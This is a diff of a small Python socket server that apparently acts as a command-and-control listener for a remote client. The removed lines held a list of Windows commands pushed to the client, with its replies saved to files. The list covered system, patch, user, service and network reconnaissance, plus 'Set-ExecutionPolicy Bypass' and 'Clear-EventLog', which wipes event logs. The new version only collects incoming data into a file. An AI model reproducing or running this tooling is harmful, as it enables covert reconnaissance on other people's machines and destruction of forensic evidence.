@@ -2,22 +2,6 @@ import socket
 
 def main():
 
-    msg_to_send = [
-        '''systeminfo''',
-        '''systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information''',
-        '''wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches''',
-        '''wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture''',
-        '''[System.Environment]::OSVersion.Version #Current OS version''','''Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches''',
-        '''Get-Hotfix -description "Security update" #List only "Security Update" patches''',
-        '''Get-Process''',
-        '''Get-Service''',
-        '''Get-LocalUser''',
-        '''Get-NetIPAddress''',
-        '''Get-WmiObject -Class Win32_Product''',
-        '''Set-ExecutionPolicy Bypass''',
-        '''Clear-EventLog''',
-        '''exit'''
-    ]
     host = 'localhost'
     port = 8080
     # Create a socket object
@@ -28,12 +12,8 @@ def main():
     server_socket.listen(1)
     
     conn, addr = server_socket.accept()
-    for comm in msg_to_send:
-        with open(comm[0:11]+".txt", 'w') as file:
-            conn.sendall(comm.encode())
-            
-            data =conn.recv(1024).decode()
-            
+    with open("output.txt", 'w') as file:
+            data =conn.recv(1048576).decode()      
             file.write(data + '\n')
     conn.close()
     
